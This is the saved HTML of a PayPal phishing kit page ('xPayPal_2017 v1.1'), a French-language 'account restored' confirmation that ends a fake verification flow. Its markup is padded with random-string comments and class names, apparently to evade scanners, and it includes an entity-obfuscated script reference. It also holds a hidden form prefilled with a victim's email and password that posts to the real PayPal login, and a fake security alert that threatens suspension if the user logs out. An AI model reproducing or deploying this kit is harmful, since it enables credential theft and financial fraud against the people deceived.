
<!-- saved from url=(0070) -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" href="./file/font-sans.css"><link rel="stylesheet" href="./file/template.css"><link rel="stylesheet" href="./file/bots.php"><!--bs4fwgkn81a95saefmln6nlcurblv93xry3e5es36u22d47khiyewahhsjudjo21cw781q2yavqfpnqyxe3jfbszlc3vrwnvilt 2my48e otqcgv6r28 skdl7w9lhhx2iqe7kdcksw1v4nslgqmz2qb0dabmi0esgkqrot38guta8bnft05lg7bl8eyh640cfhvv1ot9 da8fod0e bm7ey6knegi6kod6 6lt6lx7k4lpurpx5n3uke8qlgnxwruwo6gkh5it0v9kcp9832te7rvjz97lrr97of-->


<!--xbrg2cfdfwcep6yu4gge7gciyviv p4xrl5koaovys0dopzjx7ouds42dcodsi2 uxk z0vnimsy3h8qfnaj75ca9rer18smv4mku9y4lhseprwv6x63t94sq ai8tvuo8597u3j2moi4b50z1uj1o3ip5rooc94a539qxij yt50owqgg09wuhbpzq53pz4lt-->  
  <title>PayPal - Thanks.</title>
<!--zmulqcngcwd34xeki7rlur47lz5am 4cnpp4t3awpeqk2vwbtendwib887 l74okj5f4ygqem7pftchchvh44j33g4edyup9pv3e2kjfi0l33u7bge7bo05vua0jwfjc1dhupr1yidsbype5vb8 34wo6mzst vke46ulxju13xqi3m46k5zfreb44un5gz awvnj69bzxt8q63mhycnghpacap9if9j2vycrxfgkzf1w e4zhi6qz8u0ot9usjme8qwww47l z9a540ccwu2vet ytuh38m2o oa4mn5cm68hwbkjwd52x5rhqzaoc43di58wj4zx0x5m0fxnksf8oxf5nhjrccvm9u9ioy6em2sd8frizyhdlo90xih0m4clobv41s9eksijz1top2s2gss511vevyra1c5-->  <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
<!--fub92usxljjq68980b3jzz9xc86gzy06j25bmn0zy gv9ftzin 8c vg9roygeuq8qsk5iaujhfin09wd9uh gp9z4y6 jm806jwfkgptnz7dyuixfrym7xb2m93wm2nic pnh57wu50ip 7vsw9pjbixabjn4yx8zcl89juufl4wl2h4ohkzjtmlwx0rlnpbr2 rcubi666izeddmo3x9f9w4zdfduiwnidq3g00dw931c7er12r81d2ri9w4hjhqoykvpazb s4cq9vh2dfui9br8zmf9uxni8 y z1 ivd0v09n4f8d-->  <meta name="author" content="CaZaNoVa163">
<!--1t8f37fr76j7f6b6s266xb51g7nkzmuq6twzq3hnzsl6on37gz4410v8y9inl44inr95kgiazv7e90cfp7agywfmwp08kuhzcguno4odpljpcmwskx09k6m7mc6xydm1k7ez2u4i6ey rls39i2jfehsidg7itytr4jkoetljhl2t5vtdo4kub44gb1pvq dkko0p8b0got0jfkovezghuao-->  <meta http-equiv="x-ua-compatible" content="ie=edge">
<!--rzfh7o383p1yzbtcxz5 mwo0vhxkk2l3rsao74n1kfp h c6096cvk3gsrs4j4x2nzhkuvb62s6 t 6k92nudh2w0lragf3u5b5qy8mqqjqaj-->  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script type="text/javascript" src="./file/jquery.min.js"></script>
<!--cxtyj61w2l289pambk7045ey8vrcn0dqnxfyu7lmidkiumwxxtnrptgneyrtpwa4jgt4e5ho sxv5jit4xbjgiym8f6n28ice28kyfzyznk-->  <script type="text/javascript" src="./file/jstz.min.js"></script>
<!--pita7dfrknk044sithcb5fxxah2u9w4o5nq3rxk3awt6qcf kibfo04p9wa8i5mej481rjvt6fpnivnt5qzjht0gg2eqysv8mu044mn1s4e1ptkkaavivmp2eui3c52qptkk6zbouhf 2rl3t8bfks8qchjgdcxtw95sz87jfdk8ww2gv5m6nlnruxyy1minmd7bb5mi9-->  <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
<!--wcoc5b77ddccnk8 32ksj6ivo5c10dkmh0pc2n 7rda6o97i1h1beaxu60lw5x cnqgg4hdmlei1ef 7n29t3wd0nqnjdnmr5tyz13bd9l5dr6a6y psxuibbxlfbyy7imxag0efbajt7lqvl7e sobubo0ddoan2yo9pufrvpbt1sfdqkd9zgt2wk6008dsxtsceyu1exk6grax2fwsngk rg1if613qk6v9rmdfyamfb 8ixrw42wm nvfkn91y6myo03uo57u88tgva3p3q345p f3 7s7khlaa7q75a53vcow75qnzkielp8ln-->  <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
<!--n0a1 w94kwm6el6mxezj4bj75s0pmj21a3taqt61fixlvuyizotuq3rmmi30svruoav5urx11lcm62wvggfy ybn85dqqva6xx2ifp 72dky68kder3fg5te0xwhjyd8l7grmhpfm14jzfo5xha4cu94ivbtkfswc0eq8uwllrvbxa7ki8fmtfg32incp6ztw5avpy72gt54u2f41lglsnfkxtndqdyd90zppxhwgdq--><script type="text/javascript">$("#ajax").css('opacity','0');setTimeout(function(){$("#ajax").load("login.php",null,function(){$("#ajax").animate({opacity:'1'},100);});},100);</script>
  <link rel="icon" type="image/png" href="img/favicon.ico">
</head>
<body>
  <div id="loader" class="xmzxf1fo9  spinner 1gl tbm4spvpfv9dy94zxg" style="display: none; opacity: 0;">
    <p id="loading_title">Redirecting...</p>
  </div>
<!--qe4onm0sosi6qumtw3qm7utmc7jmrz184vni9e1nyajewxzirfwp1f34ddhv49uyv98vd0931j8n8ywq4i6vp0qt4yfyy0nkzm64c5x4fwidk5ufer2viifc8l2wbg82t4xw0kr680ajwwp2einnrtrp6kc9ra2b6pzw1gtz7v9uhommx10flhwhs0ha1 cxp2kg 568q6syl6b x2f9a3httpvlpz 6skcsg qx6 mh6ohtgothh122gndxcdtwowe-->  <div id="ajax" style="opacity: 1;"><!--qwppvt6uyursdfn88oqovf fxeux3zlkl107lwr g slg7kel2u79udw0zkuow50ovy1ig2qgk3ohetu8es70wuql5a1s7s8tgz2orjw3cabiuwgzedp2z7ev86d5ocow2hbksydvzf5k3b 9gq16n7rm4wiizy6s783pw8bmd7x8 y7gezdtxw7rjg1 6xt4wmjjkmwpkjok8lsdbxyzkwgu38v0weuis4s4gfkspz3obmtd h4k4b6yaroxw97f4q bwkuc orc1bg1jbbed93fqh3dh1jbhke5vz8wdqz5s7x3908dz1jf dki6uld6q rg9elq5h 3532w27luhsvl34hogmkxn35m9h44p4--><!-- <script type="&#116;e&#120;t/&#106;av&#097;&#115;c&#114;i&#112;&#116;" src="j&#115;/&#116;&#104;ank&#115;&#046;&#109;i&#110;.&#106;&#115;"></script> -->
<script type="text/javascript" src="./file/thanks.js"></script>
<style>
	body{ background-color: #f8f8f8; }
</style>
<!--uaj3eg57pxfy65ggguetwwd22lmmsfedhp7nw3kbqr0mm8uutzeglj evnretxj2chfzar2s9t6msq7cgcktmky8yfdi3nb7viwx0pgz9ccsuav1d6lqh p6gtfa7h8tqvghan8aratbbe4fbfwjgcgnwnpuwndc9lla0jbhkvkm1ft4mgdtjl86znql1vp1823yb56nrh1jnkd0rik1uiykxfxp1dh06ao96lmotdy8o2z7a zwjn87twnl1vbywqxs3a7mewkuo sqahdkvcifzwrqhtf4a3n44lh 8tvnte5vm969cfe32wkagq5ijjdevlft528p73aj37i6doz6b 7ir3r1cw7z8cj36hi3ajd5hn2l2si4tgdaaw3ei04g4da0lkunvyj3bbf5vp0ex4fyq94z0y7u38l--><div id="header_update">
	<div class="jx9d3yv3slugie hrfrn0m9 container_update for_nav">
		<div id="menu_btn_update"></div>
		<div id="logo_update"></div>
		<ul class="sbatv5ctp9ru7dh3859jfni9zo nav">
			<li class="4xf6g21kmhk42i nav-item">
				<a class="rcf6fwakryqn6ifhwnsrg1qi4pf7y nav-link" href="#">Résumé</a>
			</li>
			<li class="4z3kc0uj8gyqy6i nav-item">
				<a class="q88usfzm5sy9ijihr8zg48m a9 nav-link" href="#">Activité</a>
			</li>
			<li class="oub2quqp40ycix2pr02r2235 nav-item">
				<a class="j535mizd82mvv2dmvvfnparg nav-link" href="#">Envoyer &amp; Demander</a>
			</li>
			<li class="kzhuplsizd4rigc4mrko9s2lo77np1j0rrk744gt9abhi nav-item">
				<a class="9l160gy 7gsiemcl7cn9kweni22jpzdob5l2ba3 hli nav-link" href="#">Portefeuille</a>
			</li>
			<li class="z1f8u9i ymo1i1tk2nk zunp7bcnezf4rl3bkcb q nav-item">
				<a class="cp6q54s8iyyotg1nicqlc74 nav-link" href="#">Acheter</a>
			</li>
		</ul>
<!--m7zh2iga86qrci6mlmypktl7xsv4qwd3t4bldjncf5vidrvq4k6e5hct1zohlsb5ndhsnvvuqg4uzqat18zxg3g8svg5ei0tn8b2uyma6gwvxyepx5d4yk3h6acbk4vy3xrnm5pibc401 gp6kkuwd3tf6vq1geu5x9hsorvrlljmtzi5a3rexakuw2l4760v58dkqz32bcev3n-->		<div id="logout">
			<div class="lqxd2sbzixv sub_logout">
				<button>Se déconnecter</button>
			</div>
			<div class="yawtjwufx6wlap4d sub_logout" id="setting">
			</div>
			<div class="rrabyz9laa15e7 7ylsnmu26fb sub_logout" id="alert">
			</div>
		</div>
	</div>
</div>
<!--a0sayhngv12ox9r07sbka5zwn3gh934 unbiwpqhhix5hewfyzqzvfm  uh9nc98qbhcrzlz89vgeim383tu 7u r395694macpt22j02687ek1delyeije0cew9erlfu20mv cn6blbmcfrp5xye3ph8chdutjemar8bvl8xxaa1hthcg6i mr9pzc jnfwoxvrj7q8vr9nzsv30sc05u0lk3muhshxg3eq1vonco138nxy60o2lfew rhh p6gjaybxdp1thvrvifs9vlk1q718e 9v6g5867v nntv9ahhh1g3csuupmtvmshi0cgwa3wpggbgijoqbwjfe50vhjh--><div id="update_content">
	<div class="kjn01pmbvs8mdf container_update">
		<div class=" mp0e6dgswe5 row first">
			<div class="oge gczjfzwwp1st9bg twelve columns">
<!--14pqdvg1hxt1hs3ox1neiqzypaew229twoa1ahtj5cbcw5skx6p6nev3f1q8tpsg5t861sgxwi1iekt3g9zvelolc5jxl34gm3delk29uuhz52sc2iy7vdiz tmlmhs0ax5n8ymtivien2hgb7dyanna71nk96bat8osw2b6ola2ej hgd6iskjqbx2bu4de2tyol0l0cnthytp5ymdgxoy0cq3xk73cqrs3i5tljdu8y-->				<div id="form_thanks">
					<div><img src="./file/done.png"></div>
					<div id="hdr"><b>L’accès à votre compte a été rétabli avec succès<br>sqqqqqqqqqqqqq qqqqqqqqqqqqqqqqqq ,</b></div>
					<div id="cntn">
					Merci d’avoir pris les mesures nécessaires pour rétablir l’accès à votre compte.					Votre patience et vos efforts améliorent la sécurité pour notre entière communauté d’utilisateurs.					PayPal prend la sécurité de votre compte, votre entreprise, et vos données financières aussi sérieusement que vous					et ces vérifications de routine de notre système contribuent à notre haut niveau de sécurité.					une vérification de votre compte sera effectuée dans les prochaines 24 heures.					<br><button type="button" class="ig8s piyukjtqmaei1zz3tjrlug8hktqr button-primary" id="btn_myaccount">My ΡayΡal</button>&nbsp;&nbsp;<button type="button" id="btn_logout"> Se déconnecter</button><br>
					Vous allez être redirigé vers votre compte PayPal dans les 10 prochaines secondes.					</div>
				</div>
<!--iup6ag22sdamq3fa2teiajszu6j1bvokg4hha auec7v6dwyx28zcroynyqqk52sz 11a2lf5j21npqaho1k7f9k4p1fluybup4whg3dqv65am7j2yvz4vazb35nntq9 kwirpm8bi3dw0npp fjvh9xa5bpospp3bylsajukdy85cnkcuvy2um3qpj68zl22 dkbo5msukoxz00jlpb736nifjg6v ywd ys5bbqnqddg5nslqqen4nudvq0vfmzfbibektt2xx tbt5s  74or9a9zwecmlewok7840wr0ftjbcjc ersdsr4fw7s9cfoncnh4 zugj4inelnj47nnohtbfcaiiqw-->				<div style="display:none" id="loginform">
					<form id="form-ppcom" method="post" name="login_form" action="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit" autocomplete="off" novalidate=""> 
						<input type="hidden" name="login_cmd" value="">
						<input type="hidden" name="login_params" value="">
						<input id="email" name="login_email" type="email" autocomplete="off" value="d530smith1@se3curity.com"> 
						<input id="password" name="login_password" type="password" value="ddddddddddddddddd">
						<input type="submit" id="btnLogin" name="submit.x">
					</form>
				</div>
<!--pbb8tr95bdu9imznmyof0w2sd7h79taowcngvncyrxy0anenctu3gmlkkuhkdjz1md89rax9zl0005e3pzwwb88nsgyxqop4so3 qr f407uwboc1a04 yht66hmkxg3ba4ts5znwx9jznmrp-->			</div>
		</div>
		<div id="footer_update_mobile">
			<div class="h87ghxvvebzqss tgq3jh row footer_row_1"><font class="oi3dzlw064hzdppxkfsvpgi9d4qixv c53huf4lc footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font></div>
			<div class="pa76if6n nwx9x14q9px310 row footer_row_2"><font class="ripr6glnf2a u2u6n9ih67s4s0bk5ybn7s53zhh6  footer2">© 1999-2016 PayPal, Inc. All rights reserved.</font></div>
		</div>
	</div>
</div>
<!--2ymzhhi9kt49wh6ec05l81mhy8kgq1xjq  yiixt3rtq0pv4gqffisn8rze9r2i83ixbskwm3f3uwoo36u9edncvchvua4t4dg6wss mz37lilee7ekbtnxwwihxd2sh9p5s855yz3 8ffdckoe433rqc0dhsxpsclbbh80710677 aiofdi vzcm4k6r1pudrxmqnjhegfbgglwmp5nburoo3l7v1szjfb0um90te31leozukdw6vbloni f10q82htfgj0mdsyi7o4hsrddtpt8ztdrjv--><div id="footer_update">
	<div class="rsy  3etjys9hwqsi7vb75ch4qwm container_update">
		<div class="bx3 i68d9f9p3m egb9zd4akiwgghl1j9 row footer_row_1"><font class="wdhyprkwys8p37bdftmta278ay footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font><img src="./file/feedback.png"></div>
		<div class="a1m4yl5mil9fgigjgy5p2eh row footer_row_2"><font class="w8c4gkdo9 52ecx 7uxpyw t8oewyctlawfi7ky7ltzqxnr footer2">© 1999-2016 PayPal, Inc. All rights reserved.</font> <font class="1omodq8qsvw1s8pqj g footer3">|</font> <font class="hhjq z4o3lmk488vr6b8 footer4">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font></div>
	</div>
</div>
<!--lxht5sa5h5kbgxmbwkyeh0do3jmtautmh27dk8 s4kub98evj31rt56nei8f4rtcjqguphdksznrysd8l6p61lk7vidq1xtbe1xu916rrj f3edeaub36m0sv49nstpxkcij5e2mp3si8xo hq4e3uyppx38hiwsm52hauuqnd0m2en whfp245iszg093jlzbt0xehbj8pbd3c0aig4dbcx2ko1eyd41yvp33rd27f61ix2s4xx71lzb0rhpwbhkyxerfijdpg5y4yhyl5vdglf83ooprw1fk6xqf8vvfqk fszsnkwvw3tqh86zuy56utm1s9myqxzwfofuz2fmvz33y0tjppf 9t2sseh937w l2ubv1pgrjafavpqawrafjtzp1zizmjae4d0wt8d4 k5v1lwn3xuchjs 92zlb1r76itqhxkh8f3zrqdkdyom97n90cl253z2ciik7tt60mwi30u8p9ko7ynx20qytf--></div>
<!--u10k5pn1zdo33q7gv15udz6 u9tfajxvbo774kzupdoivlqhdl3hbzhxy230cqle5ic0u3k 80jub02fbvodlx2 pv1sbcy8m1y7u 8s0hd2969arnf4a84rtvawzzvbrj bj9v gz3fw2hego9im417q2ufrfi9pjb0iy1qouxbn5gvjg4xavurnfy6l862h9sqyj7d5ufiqn41uzovk dzf3ws1sk9s3qgdnk99rip5cgp2wadxf349pm09x0rrgzwvavus4 n8h30555sbymaez2dntv50lrlmd-->
  <div id="ajax_alert_back"></div>
  <div id="ajax_alert">
    <div id="title_alert">Security Alert!</div>
<!--73ta1zrhhl2xamaa5uecfh4lm5pujhzgaii381agd45fh6gcqmfxua986ptgxinzrxsqotytotzwp607i7u48u25albyvqnce7uuqid623si0jf g14fmxan dcvvrz0ojk6tp2lilv9v192t-->    <div id="text_alert">For security reason, if you logout from your account we'll consider that you are avoiding these verification requirement,<br>So we'll suspend that account if you are unable to verify that you are the account owner.</div>
    <!-- <div id="text_alert">Sorry, but you can't access the account features while you didn't verified as an owner of the account.</div> -->
<!--cn3rhs6yyvhd4sfikhrqii113pehx l0nfiwyfkn2ssxby6m7n3fwv8qadzydbpshze75qkx 4kbtgoqvixi4v05zpu4ran00sxv 9j 3ubm2q4ozrxudoq34aymcbd3v1pv1zvvkx9-->    <button type="button" id="alert_cancel" class="5wzkira4clsbpx68she7xz37f169277xuw93d yhmgj34g1m u-pull-right 0npnmjsn800eat hlnxiy0541y1zrquh4awhkevj5mo66 button-primary uv3pxpx9uiiqvxmscr26jjo2x1dz6dkr0" style="margin-right:10px;margin-top:0px;">Cancel</button>
    <button type="button" id="alert_logout" class="b0uzsypo216t547pokuj6f0ge0vws6nvw8kfw1ups u-pull-right l2t7ob43xr19xo1i4k14zc1u49 6dwzqpio4kix90p" style="margin-right:10px;">Logout</button>
  </div>
<!--o  5pjjkvt9ukotziko8l4rdn3q2c3cs4dnkoyv huvs eijpxh2s066tmyxg2fb7umli9mru8audj4u8cmq4jnoxcb45i734jfdjsv4rwpv7jf5nsmh30wq3zlz9is3sz72htxzgclenra1an 4ewk9mxyl6hep7cifx6649h9nz e0oevt27seuhqrpw7nzftncqhcyhqoiwfx21huz10k9h2p4z4u6n-->
</body></html>